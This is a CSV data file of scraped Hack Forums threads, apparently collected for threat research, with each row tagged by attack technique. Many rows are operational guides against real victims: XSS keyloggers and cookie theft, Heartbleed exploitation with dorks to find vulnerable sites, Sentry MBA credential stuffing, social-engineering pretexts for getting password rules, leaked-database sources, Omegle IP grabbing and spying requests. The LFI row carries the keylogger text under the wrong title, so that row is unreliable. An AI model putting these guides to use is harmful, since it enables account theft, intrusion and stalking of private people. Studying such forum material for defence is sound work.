Topic,Technique,Tactic,Role,Thread,Content
"[Joomla Hacking] Joomscan, SQLi, Dict. Atk, Reverse php shell, YUM Priv. escal. #4","Drive by compromise,Command and Scripting Interpreter",,,https://hackforums.net/showthread.php?tid=6068925,"Welcome once again this corona crisis is increasing my productivity I truly hope this isn't some kind of phase. Well, let's continue! In this example, I'm going to attack a Joomla website to capture two flags a user and a root flag this challenge was a bit harder than the LFI one obviously🙃 when visiting the IP I'm getting a nice looking website about spiderman. Let's use a tool for cracking it john the ripper brings back memories and it works on windows so that's a plus too! I'm using a Dictionary attack with the rock you wordlist. Let's do this! We are almost there. With the credentials we've found earlier we can log into the Joomla administrator panel. the location for the administrator login in a Joomla installation is by default /administrator Success! let's upload a nice reverse shell. You should go to extension->templates->templates"
Goldmine Ebooks Information [No Bullshitry Links],NA,,,https://hackforums.net/showthread.php?tid=6068856,"Information is power. But like all power, there are those who want to keep it for themselves. The world's entire scientific and cultural heritage, published over centuries in books and journals, is increasingly being digitized and locked up by a handful of private corporations. Want to read the papers featuring the most famous results of the sciences? You'll need to send enormous amounts to publishers like Reed Elsevier. There are those struggling to change this. The Open Access Movement has fought valiantly to ensure that scientists do not sign their copyrights away but instead ensure their work is published on the Internet, under terms that allow anyone to access it. But even under the best scenarios, their work will only apply to things published in the future. Everything up until now will have been lost. That is too high a price to pay. Forcing academics to pay money to read the work of their colleagues? Scanning entire libraries but only allowing the folks at Google to read them? Providing scientific articles to those at elite universities in the First World, but not to children in the Global South? It's outrageous and unacceptable. ""I agree,"" many say, ""but what can we do? The companies hold the copyrights, they make enormous amounts of money by charging for access, and it's perfectly legal — there's nothing we can do to stop them."" But there is something we can, something that's already being done: we can fight back. Those with access to these resources — students, librarians, scientists — you have been given a privilege. You get to feed at this banquet of knowledge while the rest of the world is locked out. But you need not — indeed, morally, you cannot — keep this privilege for yourselves. You have a duty to share it with the world. And you have: trading passwords with colleagues, filling download requests for friends. Meanwhile, those who have been locked out are not standing idly by. You have been sneaking through holes and climbing over fences, liberating the information locked up by the publishers and sharing them with your friends. But all of this action goes on in the dark, hidden underground. It's called stealing or piracy, as if sharing a wealth of knowledge were the moral equivalent of plundering a ship and murdering its crew. But sharing isn't immoral — it's a moral imperative. Only those blinded by greed would refuse to let a friend make a copy. Large corporations, of course, are blinded by greed. The laws under which they operate require it — their shareholders would revolt at anything less. And the politicians they have bought off back them, passing laws giving them the exclusive power to decide who can make copies. There is no justice in following unjust laws. It's time to come into the light and, in the grand tradition of civil disobedience, declare our opposition to this private theft of public culture. We need to take information, wherever it is stored, make our copies and share them with the world. We need to take stuff that's out of copyright and add it to the archive. We need to buy secret databases and put them on the Web. We need to download scientific journals and upload them to file sharing networks. We need to fight for Guerilla Open Access. With enough of us, around the world, we'll not just send a strong message opposing the privatization of knowledge — we'll make it a thing of the past. Will you join us?"
Goldmine Complete Courses HD [No Bullshitry Links],Develop capabilities,,,https://hackforums.net/showthread.php?tid=6068863,Just dont hesitate to send me personal message if the links is not already working so that I can still share the links for people interested in learning. The videos that you about to download are complete courses and HD providing the best learning when it comes to ethical hacking.
How to view all public emails of Facebook Friends,Masquerading,,,https://hackforums.net/showthread.php?tid=6067357,"I know some people are having a few issues extracting emails as Yahoo no longer lets you export, there is one way around it, however it only lets you extract emails and I'm not sure how you'd export it as Name - Email format - but if someone knows how to do this it would help myself and other people. 1. Log into Facebook, and select Settings. 2. Once you're under Settings, select ""Your Facebook Information"" 3. Then Click ""Download Your Information"" 4. Deselect them all, and leave ""Friends"" selected. Create the file and wait for it to be prepared, this shouldn't take any longer than 5-10 minutes. I've 4700 friends and my file was ready in 3 minutes. 5. Once file is ready, you'll receive a Facebook notification, allowing you to then download the .html file. Load the HTML file, and select ""Friends"" - It should show a huge list of all your friends with their emails/contact visible. 6. Use Control + F and input '@' to show how many emails are present in the file. If someone knows a way of automatically extracting these as contacts then please post below, otherwise manually extracting seems like the only way atm, it may be possible to use the source code and an online tool to then extract emails only, but I'm not sure. So I'll wait for someone to respond on this and see if it's possible."
Creating an undeletable/unrenamable file in windows,Remote,,,https://hackforums.net/showthread.php?tid=6069368,"I was able to, via WSL, create a file named con.exe, and am unable to remove or rename it in windows explorer. $ touch con.exe [Image: 0mX] [Image: qmz] I haven't found a way to execute this yet, but if it can be, it might be relatively invulnerable to traditional file operations in windows. Imagine putting your payload in system32 with a name like that, it would be undeletable, unrenamble, even as administrator. If it can be executed, you have something that windows defender might not even be able to quarantine. If it's impossible to execute under any circumstance with such filename, perhaps it could be used as a means of persistence. a daemon quickly copies the file to something executable, then executes that, maintaining a copy of your payload on the filesystem"
[Website]Fuel CMS 1.4 Remote code execution: Using Python to gain control #6,Remote Services,,,https://hackforums.net/showthread.php?tid=6069321,Another capture the flag challenge. This room is called Ignite and it runs the fuel CMS. This challenge revolves around a Remote code execution bug in their 1.4.1 version. Its a quick example and should be easier than my previous CTF tutorial you can find this box on tryhackme. Enough talking let's dive in and try to gain access!
[Tutorial] XSS Keylogger [Keylog from a website!],Input Capture,,,https://hackforums.net/showthread.php?tid=2540448,"This is my first tutorial, I originally came accross this script to records keypresses using a vulnerable site on another forum. I searched and found it had been posted here by the owner but it didn't seem to get many comments and I don't think many people are aware of this trick. The creator is Wiremask but the script has the credits left in. Anyway, this tutorial will show you how to turn a vulnerable website into a keylogger that will log all keypresses once the victim has clicked on our poisoned link and types on the webpage. You need to have a website that is vulnerable to XSS injection, I won't go into that now because thats a whole different thing. So don't ask me ""how to keylog facebook??"" 1. Ok so the first thing we need to do is to create some web hosting. We need a host to host our keylogging script on it and this is what will be included in the poisoned url that we will send to people. I will use hosting.eu.pn because they don't seem to suspend accounts but you can use any host like 00webhost etc."
"[LFI] PHP filters, RCE: Remote code execution an LFI advanced example Prt2 #5 [CTF]","Input Capture,Valid Accounts",,,https://hackforums.net/showthread.php?tid=6069000,"This is my first tutorial, I originally came accross this script to records keypresses using a vulnerable site on another forum. I searched and found it had been posted here by the owner but it didn't seem to get many comments and I don't think many people are aware of this trick. The creator is Wiremask but the script has the credits left in. Anyway, this tutorial will show you how to turn a vulnerable website into a keylogger that will log all keypresses once the victim has clicked on our poisoned link and types on the webpage. You need to have a website that is vulnerable to XSS injection, I won't go into that now because thats a whole different thing. So don't ask me ""how to keylog facebook??"" 1. Ok so the first thing we need to do is to create some web hosting. We need a host to host our keylogging script on it and this is what will be included in the poisoned url that we will send to people. I will use hosting.eu.pn because they don't seem to suspend accounts but you can use any host like 00webhost etc."
Learning Network+,Develop capabilities,,,https://hackforums.net/showthread.php?tid=6026256,"Recently i started reading a Network+ book since someone recommended it for me. I am curious about pentesting, how devices and common hacking tools work (i want to be the opposite of what people in this forum call ""skids"") and hacking in general. I was planning on reading the Sybex Comptia Security Guide after im done with Network+. Am i learning things in the right order? i know that eventually i'll need to start messing around with kali, should i do this while i study Network+ or later on?. This is a SUPER long term project since im also a mechanical engineering student and im doing this on my spare time (when i get any). Just need someone to point me in the right direction, any help would be appreciated 👍 ."
[Website] LFI: Local file inclusion? what is it? and a simple proof of concept #3,Exploitation for process injection,,,https://hackforums.net/showthread.php?tid=6068703,"A few days ago I did a CTF challenge with a few buddies of me and this was one of the easier ones. It mainly focussed on a super simple LFI vulnerabilities LFI stands for Local file inclusion. Simply put you can inject local files in the webserver and if the webserver runs as root you can pretty much call a lot of files 😖. The counterpart of LFI is RFI which stands for remote file inclusion same principle applied here only this time you aren't including a local file but a remote one such as webshell or an exploit. In this example, we've used the local one. How can this happen? well, most of the time it's due to sloppy or rushed code writing a quick example or POC and well not updating it..."
[TUTORIAL] Heartbleed Vulnerability,Input Capture,,,https://hackforums.net/showthread.php?tid=6068270,"""Heartbleed is a security bug in the open-source OpenSSL cryptography library, which is widely used to implement the Internet's Transport Layer Security (TLS) protocol. This vulnerability, classified as a buffer over-read, results from a missing bound check in the handling of the Transport Layer Security (TLS) heartbeat extension, the heartbeat being behind the bug's name."" A explanation of heartbleed taken from https://en.wikipedia.org/wiki/Heartbleed. In other words, Heartbleed is a vulnerability that pretty much allows you to obtain data being sent allowing you to obtain information like usernames, passwords, emails, etc. Which Sites Are Vulnerable: When this exploit first came out (April 3, 2014) every site using SSL was vulnerable to this causing a very big problem for even the biggest of sites. At 1 point sites like google,Tumblr, etc were vulnerable but most big sites have been patched an hour or a day into the discovery. Due to this being an old exploit it is mostly patched on all SSL sites but can still be abused on 100's of websites. These SSL versions are at the moment vulnerable and patched: OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable OpenSSL 1.0.1g is NOT vulnerable OpenSSL 1.0.0 branch is NOT vulnerable OpenSSL 0.9.8 branch is NOT vulnerable To find a site that is vulnerable download the following plugins on your web browser: Chrome Bleed: Chrome Bleed Link Firefox Heartbleed: Firefox Heartbleed Vuln Checker You may also use 1 of these 2 sites: http://tif.mcafee.com/heartbleedtest https://filippo.io/Heartbleed/ To find vulnerable websites try using this dork in a google search: inurl:https:// If you wanna target a certain type of site just type in a keyword before the dork I provided. For example: hunting inurl:https:// How To Exploit Sites: Found a site? Well now let's find out how to exploit it and be rolling in the accounts. First download bleedout. This program allows you to exploit sites. Put this in a folder as it does create many log files. Open CMD and type in ""CD C:\Users\(Your Computer Username)\Desktop\Bleedout"" In other words just do ""CD"" command and type in the directory bleedout is located in. After type ""bleedout"" for info on how to use it or just read what I am about to type up. Type in ""bleedout -h (domain name without http://)"". Then let this run for hours."
Creating dictionaries based on information from OSINT - Tutorial part 2,Drive by compromise,,,https://hackforums.net/showthread.php?tid=6068455,"Returning to the starting point. What if the network turns out to be a private network? At first it may seem that reconnaissance in this case is pointless but this is a very wrong assumption. In fact, in this situation, we can consider two probable cases: either the owner changed the default password or did not. In the latter case, the matter is much easier because it is enough to check the router model (look at the ssid network. I am sure that if a person has not changed the ssid network, then the default password has not been changed. Now just ""Google"" this equipment to learn the rules creating passwords by the producer (I wrote about it in another tutorial). But let's consider an example where the ssid and password were changed. How can we narrow down the space for potential passwords ?. First of all, I would try to determine who exactly this network belongs to (this is a specific person). The easiest way will be to visit the place (its location is determined using Wigle) then we can based on information from mailboxes (or intercoms if we have to deal with a block of flats, in which case we will also need a phone application capable of analyzing the strength of the wifi signal ( e.g. Wifi Analyzer) and based on the signal strength, we are able to determine the apartment from which the network comes from. Now just look at the name plate on the front door to find out the personal details of the owner). If, however, it turned out that it is impossible to determine the data in this way, we can use the so-called ""subscriber lists"" available on the internet (this is a digital telephone directory). Just enter the desired address there and thanks to that we will get to know the data of the person living at the given address (provided that such a person has agreed to enter it in such a book early and I am honest to say that in my country it is rare that people do not agree to it). For the purposes of our example, however, let us recognize that we have learned the name of the owner. The next step to take would be to check the social media of such a person (facebook, twitter and thousands of other portals) to determine their interests, workplace, hobbies, pages and things he likes, posts he publishes, etc. Any such information is invaluable. Why? Because each of them can be a potential password. People are very lazy beings by nature and strive for ""simplifications"" in every possible situation and thus become very predictable. There is only a percentage of people who follow the basic safety rules, e.g. when creating secure passwords, all the rest is based on simplifications, patterns that are easy to remember (e.g., cat's name + current year or your favorite football team + your child's date of birth). In many, many cases such people nunknowingly publish ""hints"" to their passwords in posts on social networks (let's assume that someone posts a lot about their favorite football team, try to match the team name or name of the top player of this team with the current year. I guarantee you that at 65% it will be the password to his email inbox, wifi or other service. Variations of this pattern may be different, experiment, you'll see it works: D) Based on the information we have, we are able to generate a dictionary modified with specific patterns (such as current year, members' birth dates) families, names of favorite things, etc.) There are really many such examples and all in this field you are limited only by your own imagination and set of information. Of course, I would be ignorant if I said that it is a reliable method, it can always happen that it will not be possible to obtain a password in this way because, for example: the password will be randomly generated and will not be associated with any information shared by the owner of the network. However, I think that this technique is very effective and not only when cracking passwords (repeatedly finding a credit card I was able to set a pin to it within 15 minutes (you do not even realize how many people set the date of birth as a pin) and I have often called shock and disbelief on the owner's face. All in all it is an effective way to pick up XD). It is also worth mentioning here another important thing which is checking for password leaks from various websites. There are many different services such as haveibeenpwned.com where you just need to tap the email address and we can easily find out if the password for the email has leaked. With such a password, we are able to generate thousands of other passwords based on it, which may prove effective in our attack. And that would be enough when it comes to generating dictionaries. I am aware that what he describes is an iceberg tower and one could write a lot about it, but the assumption was about the basics. Below are links to pages that can be useful when creating dictionaries: WEBSITES WITH DATABASE LEAKS: - haveibeenpwned.com - Vigilante.pw - https://down.tencent.pp.ua - this server contains several hundred GB of various database leaks, personal data, credit card numbers from various services such as Amazon, Xaomi, Gmail as well as many Asian services. However, I warn you against downloading any software, scripts or similar stuff from there. This site does not belong to me and I am not responsible for the software there (I downloaded several GB of various leaks from it myself and they are cool but as I said before, do not download anything else from there !!! You have been warned:"
[Metasploit] Hacking windows: privilege escalation and migration in metasploit #2,Abuse elevation control mechanism,,,https://hackforums.net/showthread.php?tid=6068573,"Welcome, This tutorial will be a continuation of the last [Nmap & Metasploit] Windows breaking & entering Port mapping & metasploit ICE #1 We will explore how we can escalate our privileges and gain administrator privileges on the system Before we can do that we should gather some more system information about our target. At this point in time, you should have a meterpreter session running like this one [Image: 1.png] We should get the current user. we can do this by typing getuid Code getuid This would give you a result similar to this Dark-PC\Dark [Image: 2.png] Now that you know the user you should get some more information about the system specification like OS buildnumber architecture etc... You can achieve this by typing sysinfo this stands for system information"
Creating dictionaries based on information from OSINT - Tutorial part 1,"Drive by compromise,Input Capture",,,https://hackforums.net/showthread.php?tid=6068453,"I decided to write a small guide on creating effective and personalized dictionaries for cracking passwords based on data from ""white intelligence"" and knowledge about human nature (called social engineering;)) I think that creating dictionaries is crucial for the effectiveness of password cracking attacks and many people approach this topic with incorrect assumptions, which directly translates into their effectiveness in action. Based on the examples, I will try to show the basic assumptions in creating such lists that, in my opinion, increase our chances and save a lot of time during work. Although this guide will be very theoretical, I will try to put here links to sources / pages that in my opinion may be useful. As usual, if I made a mistake, let me know;) and now we are flying with it. As I mentioned earlier, generating effective (not effective :)) dictionaries is crucial for success in the process of breaking passwords. But just having a huge dictionary containing all possible combinations of characters does not provide us with efficiency when breaking a password (an attempt to crack a well-chosen and complex password is quite strongly limited by the capabilities of our equipment and if we do not have a super-computer on our services, such a password cracking can really take a lot of time and sometimes it will be unreachable even if the huge dictionary will contain the password we are looking for). It is known that in the internet age we can use specially dedicated online services for cracking passwords (which I use with the rest), but they sometimes fail even though in many cases their effectiveness is quite good. However, I have convinced myself that a well-constructed dictionary will be ten times better than many powerful online services. I will compare it to a shot from a sniper rifle and a shot from a children's slingshot, we know what is more laughable: P To better illustrate this, I will use the first better from the edge example. You want to hack into a wifi router, at the very beginning you only know the ssid network. You are intercepting a handshake and trying to crack a password. You start aircrack (or hashcat, it all depends on which program you prefer) in combination with several different dictionaries (let's say you used the dictionary with default passwords in succession, then you started the numeric dictionary (from 8-15 digits) and at the end you used a password built of leaked to the internet) but unfortunately you didn't break it. What will you do next? do you launch a dictionary with all possible password combinations? How long will it take you to crack a password with this technique? And this is where white intelligence techniques come to the rescue. Thanks to the reconnaissance we are able to get some information about our goal and try to narrow down the area of ​​our search in terms of a potential password. Returning to our example, instead of senselessly and laboriously breaking the password by the method of brute force, it would be better, for example, to check the geolocation of our network using Wigle (internet map of wifi network) and find out whether the network we are dealing with belongs to a company or rather a private person (if the network is located in a large block of flats, we can certainly assume that it is a private network, and companies are trying to ""mark"" their headquarters in services such as google to help potential customers reach them, so quick patting the coordinates to google maps will dispel your doubts: D). If it turned out that I have to deal with the company, the first place I would go is the company's website, which many times turns out to be a treasury of knowledge about its employees. Secondly, I would visit the social media of the goal itself, but also of their employees (and here I point out that for me the most ""valuable"" employees are, of course, those from the IT department. For known purposes, errors made on their part are critical and many times it happens that it is on their part, the easiest way to get information is It is quite often that small businesses simply cannot afford to hire a company specializing in Internet services security that could watch over the security of the company 24/7 so they burden their technical employees to such an extent that it is very easy to make a mistake. I have often been a world of situations in which when searching Google Groups I came across otware of a group of employees of a company where they exchanged information about security or put on them various sensitive information from the point of business. You probably wonder what exactly it has is the connection with the creation of dictionaries? Hold on for a while and I'll give you a concrete example of how I would use it). After obtaining basic information such as names and telephone numbers of employees, working hours, distribution of departments in the company and the like I could try to learn a bit about politics of company passwords (if it exists at all, sometimes it happens). Let social engineering help us again :) it would look something like this: I would call an IT employee on Friday at 14.45 (Sounds strange but think about it so that everyone is tired after a hard week of work and when people realize that in a few minutes they end their heavy drudgery, many of them ""turn off"" logical thinking while enjoying the upcoming weekend) claiming to be an employee of one of the departments and pretending to be a completely ""unknowing guest"" I would sell him such a story ""Here NAME SURNAME from such and such department. I have very serious problem. Yesterday someone broke into my private computer and stole all my bank passwords, data from various websites etc. The worst thing is that I had the same password everywhere. I reported it and told the police to change all my passwords. to do on my company computer but one of my colleagues from my department told me to at the beginning he contacted you because our company has some rules regarding passwords. Could you help me and tell me how to create the correct password? ""I know that now people who are familiar with the topic will speak and say that nowadays administrators will not be fooled by this type of number just because they can change passwords"" remotely ""for all domain users. Yes it is true and in such a case such an attack will prove to be ineffective. But believe me or not that many small companies in Poland (in which I live ^^) can be caught. I used this attack several times myself and I received information about the complexity of passwords, which was enough to generate the right dictionary and reduce the time needed to complete the task. As you can see, a set of several seemingly innocent information combined with a good ""played"" phone (social engineering attack) acts like a deadly sniper shot: P I am aware of the fact that the examples I use are trivial ale it seems to me that they clearly show the value of reconnaissance and that every time spent on white intelligence will double pay."
[OP8] [TUT | Security] Basics of a Honeypot,Masquerading,,,https://hackforums.net/showthread.php?tid=6068367,"Honeypots are decoy systems (intended to look like legitimate, openly vulnerable systems to attract attackers or hackers) working alongside actual production systems on a server or network. These are to lure attackers into thinking that they are actual targets and add to various security monitoring opportunities for hackers and misdirect them from their actual target. These are designed depending on one's needs and is a significant line of defense in mitigating attacks early. Some are as advanced as being capable of detecting attacks or deflecting them away from a legitimate target. They can also be used to gain information about the source of attacks (usernames, passwords, IP addresses). A Simple Principle You come prepared for attackers. The idea is to prepare something that would attract their interest, the honeypot. Then wait for the attacker to show up. Types of Honeypot Tech: Malware based: Also known as replication tech. These are designed to emulate as storage devices. Commonly used tech such as Ghost Project. When the malware tries to infect your machine, the Honeypot will trick the malware into infecting the emulated USB Device instead. Spam Countermeasure based: These are often used to emulate open mail relays and open proxies. When Spammers test the open mail relays by sending themselves an email first, if they succeed, they then send out large quantities of spam. This type of honeypot can detect and recognize this test and successfully block the massive volume of spam that follows. Database honeypot: Attacks such as SQL injections often goes undetected by firewalls. So by using a database firewall, which can provide honeypot support to create decoy databases and infect them instead of the main database will keep your website safe. A good example of this is the MyBB AdminCP Honeypot. Honeynets: Rather than being a honeypot in itself, it's a network that has a cluster of pots."
[Nmap & Metasploit] Windows breaking & entering Port mapping & metasploit ICE #1,"Network sniffing,Network Service Discovery",,,https://hackforums.net/showthread.php?tid=6068305,"Welcome, This is my first tutorial in a long time in this section. I've got some time on my hands these days and I think these tutorials could be beneficial to the community. So here we go. This one is tailored to getting to know how to work with Nmap and Metasploit on a windows system. Why windows well this computer is under spect for running virtual machines and well it's all I have at my disposal at this moment. Please enjoy! The reconnaissance fase This step is an important one. Well, of course, it is important you need to know what ports are open on your victim/target computer so that you can deduct what kind of services are running on it. A port doesn't necessarily mean that that specific service is running on that system but it gives an idea on what you could expect."
O.S.C.P - P.W.K 2020,NA,,,https://hackforums.net/showthread.php?tid=6068081,
FACEBOOK USERS E-MAIL,"Trusted relationship, Valid accounts",,,https://hackforums.net/showthread.php?tid=6064103,"Does anybody knows, how to find e-mails of someone, who is registred in facebook? It was possible via yahoo mail when you conected fb account with yahoo and after that was possible to get all friends e-mail adressis in contats. Now it is not possible to do that with yahoo and I need to find another way, how to get this mails. I will be glad for that."
[TUTORIAL] WiFi Cracking Tutorial - Part 1,"Network Sniffing,Encrypted Channel",,,https://hackforums.net/showthread.php?tid=6067351,"Welcome to another Hacking Tutorial by HTML My first tutorial explained on how to protect yourself from DoS/DDoS attacks. But of course, to actually attack a computer, you must have some form of connection to it. One of the obvious mediums of connectivity is a wireless network. By cracking into a network, you can then sniff the network, steal bandwidth, use their IP address to browse anonymously, and perform exploits against computers on that network with ease. This tutorial will cover cracking the most basic common form of wireless encription: WEP WEP stands for Wired Equivalent Privacy, and this form of encryption is relativity weak, so can be cracked with some speed. It has been replaced by modern networks by WPA and WPA2 encryption, which i will cover in subsequent tutorials, but WEP is still surprisingly common, so it is a worthy subject for the beginning tutorial in my series. Cracking a WEP encryption basically works on the principle of capturing packets of data sent on the network, and using them to decode the encryption key. We will be using Aircrack-NG to crack the encryption in this tutorial, which is my favorite program for cracking wireless networks. 1) Find your wireless adapters name This is simple, just open a terminal and use this command to find your wireless adapters identifier:"
[TUTORIAL] Basic DoS | DDoS protection,Network Denial of Service,,,https://hackforums.net/showthread.php?tid=6067315,Hi everyone. I just thought about doing a little securing-for-noobs tutorial. So here it comes. Be advised that this is just very very basic DDoS and DoS protection in real case is: - a good infrastructure - external firewalls - core routers external from firewall - a good overwatch - fallback systems and much more. So this wont keep you from a real DDoS attack but however it could keep some idiot skids from taking you down. What we basically take to establish a little security is iptables. it should be preinstalled on nearly every servers but in case it isnt you can do it e.g. in the following ways:
[TUTORIAL] Raising sniffer for XSS vulnerabilities,Steal Web Session Cookies,,,https://hackforums.net/showthread.php?tid=6067222,"In this article I will tell you how to raise a sniffer for introducing vulnerability in XSS with the subsequent hijacking of cookies. The sniffer that I wrote sends a log to Telegram which, as for me, is quite convenient. The log from the sniffer has the following form: IP - 185.250.207.58 Country - Netherlands City - Dronten Test site Date - 04/09/2020 21:25:39 User Agent - Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36 Referer - Cookies - test=coookie; test2=cooke2; In order to install the sniffer, simply upload the notify.php file to your hosting. Also on GitHub I added the Sniffer.php file. This is an example of using a sniffer (You can simply rename, add a bot token and your Telegram ID) Implementation example: https://pastebin.com/vdXXyeiu"
Vulnerability Scanners,"Active Scanning,Drive by Compromise",,,https://hackforums.net/showthread.php?tid=6066447,"Comodo’s HackerProof is considered to be a revolutionary vulnerability scanning and trust building tool that enables overcoming the security concerns of your visitors. Following are a few key benefits you can obtain from HackerProof: Reduce cart abandonment Daily vulnerability scanning PCI scanning tools included Drive-by attack prevention Build valuable trust with visitors Convert more visitors into buyers Besides the above-mentioned benefits, HackerProof also provides the visual indicator needed by your customers to feel safe transacting with you. It helps decrease shopping cart abandonment, enhance conversion rates, and drive your overall revenue up. Finally, it includes patent-pending scanning technology, SiteInspector, which is capable of eliminating drive-by attacks, thus providing a new level of security for all those who proudly display the HackerProof logo. 2. OpenVAS This is an open source tool serving as a central service that provides vulnerability assessment tools for both vulnerability scanning and vulnerability management. OpenVAS supports different operating systems The scan engine of OpenVAS is constantly updated with the Network Vulnerability Tests OpenVAS scanner is a complete vulnerability assessment tool identifying issues related to security in the servers and other devices of the network OpenVAS services are free of cost and are usually licensed under GNU General Public License (GPL)"
Get someone's IP from Omegle,Network Sniffing,,,https://hackforums.net/showthread.php?tid=5986966,"Hereby I will explain to you how to get someone's IP address on omegle. To do this, we need the * WireShark * program. http://www.wireshark.org/ You can also install WinpCap. The Wireshark computer program is a 'packet sniffer' and 'protocol analyzer', a program that is used to capture and analyze data on a computer network. Wireshark is a fork from the formerly popular Ethereal. The functionality of Wireshark is somewhat similar to the standard tool tcpdump, but offers a GUI and more options for sorting and filtering data. With the program the user can see which data is being sent over the network by putting the network card in 'promiscuous mode'. Wireshark does not simply depict network traffic, but ""understands"" the structure of the numerous network protocols. In this way the software can display the different nested protocols and display the contents of each field. This is a small explanation about the program, We are going to start. After you have downloaded and installed Wireshark, open the program. We click on our Local Area connection and click on start. Now we will in UDP above the filter tab. Now go to Omegle.com We click here on * Video * So now you get connected with someone you can talk to, and I know a lot more. Wink Because that person's webcam is on, you will constantly see the same data. Which is his IP."
Whatsapp spy,"Remote Services,Input Capture",,,https://hackforums.net/showthread.php?tid=6066827,Hi all I need to spy to someone whatsapp I can access to his mobile physician and setup any thing on it
[Tutorial] How to start with Web Pentesting Part 1: introduction,NA,,,https://hackforums.net/showthread.php?tid=6066336,"Hey everyone, In this tutorial I am going to explain how you can start with web pentesting. I am not an expert in web pentesting but I love doing it so I have some experience with it. Do I need to have programming knowledge before starting web pen testing. I would say it is not necessary as there are many tools that can do the job for you. Therefore you do not actually need any programming experience. But I strongly advise you to learn some basic html, css and js to start. If you want to learn more about web pentesting I would definitely recommend to learn the following programming languages: -HTML -CSS -Javasript -PHP -SQL"
Does SQLi still work?,"Exploit public facing application, Drive by compromise",,,https://hackforums.net/showthread.php?tid=6066574,"I'm not seeing much anymore on SQLi's anymore, I remember there was a software (began with J - can't recall) that was popular to find these vulnerabilities. Is it still around? If SQLi is dead, what's the new method people are using to expose vulnerabilities in websites?"
[TUT] Hacking a Satellite (Legally),Obfuscated files or information,,,https://hackforums.net/showthread.php?tid=6066179,"Premise: Anything can be hacked. Literally anything... Including of course satellites (birds) in low Earth orbit (LEO), flying at the ludicrous speed of 17,500mph (Mach 26.5). Most command sequences are unencrypted and rely on security through obscurity, after all MITM attacks in space are fairly hard."
What can I do with an ip address?,NA,,,https://hackforums.net/showthread.php?tid=6066393,"I have the public and private IP address, access to the administrator panel of the internet provider, everything"
"[Tutorial] How To Crack Accounts! (Netflix, Spotify, etc...)",Brute Force,,,https://hackforums.net/showthread.php?tid=5237908,"It's your fellow pancake coming back with a tutorial on how to crack accounts such as Netflix, Emails, Spotify, and many more!! Things You Need -Sentry MBA -Config File -Combo File -Fresh Proxies All Download links will be at the bottom of this thread Directions 1.) Download Sentry MBA, A Combo file, A Config File, and Proxy scrapper (Links at the bottom of the thread) and open up Sentry MBA. [Image: CgCS5BiUkAEYQA1.jpg:large] 2.) Now go to the Settings tab, then press General, then go to the Snap Shot section on the bottom left and press Load Settings From Snap Shot to load your Config file. [Image: CgCS7h8UAAAeSad.jpg:large] (Be sure when you choose your Config file to change file settings to all files because configs are mostly .txt files now-days) [Image: CgCS9zqUAAIEpbd.jpg:large] 3.) Now you are going to load your Proxy list. You are going to go to the tools tab and click on Proxylist. when you get there, you are going to click the folder like icon"
Is it possible to hack playerup.com website,Hijack Execution Flow,,,https://hackforums.net/showthread.php?tid=6066000,Is it possible to hack Playerup.com
How to hack any website,"Process Injection,System Services",,Vendor,https://hackforums.net/showthread.php?tid=6065954,"I will teach you how to hack any server. So fast. We will work with Kali Linux and I will show you how to inject a payload in a .exe. More info on Discord, but only people interested. Price: 60€ Discord: quique90#5376"
How to hide a file in jpeg,"Masquerading,Drive by compromise",,Author,https://hackforums.net/showthread.php?tid=6065256,"some good old instructions that I found to hide documents in a jpeg so that your confidential data remains secret forever. (Actually this trick works for every type of data) 1. WinRAR your documents or anything.Just put in a single .rar file. 2. Now copy your .rar file and put it in the same directory as a jpeg picture (c:\secret is a good place to put it) 3. Open up a command prompt by clicking Start/Run and typing Ã¢â‚¬Å“cmdÃ¢â‚¬Â and click ok. 4. In the DOS window, type Ã¢â‚¬Å“cd c:\secretÃ¢â‚¬Â to navigate to the folder 5. Type Ã¢â‚¬Å“copy /b input.jpg + input.rar ouput.jpg (where input jpeg is the picture you want to show, input.rar is the file you want to hide and output.jpg will be the name of the new combined file) ThatÃ¢â‚¬â„¢s it! You can double click the new file and it will show it as a picture, butÃ¢â‚¬Â¦ if you open it with WinRAR, you will see the files contained. The picture above has a secret file in it, right click and save picture to your computer and then open it with WinRAR to see what I put in there!"
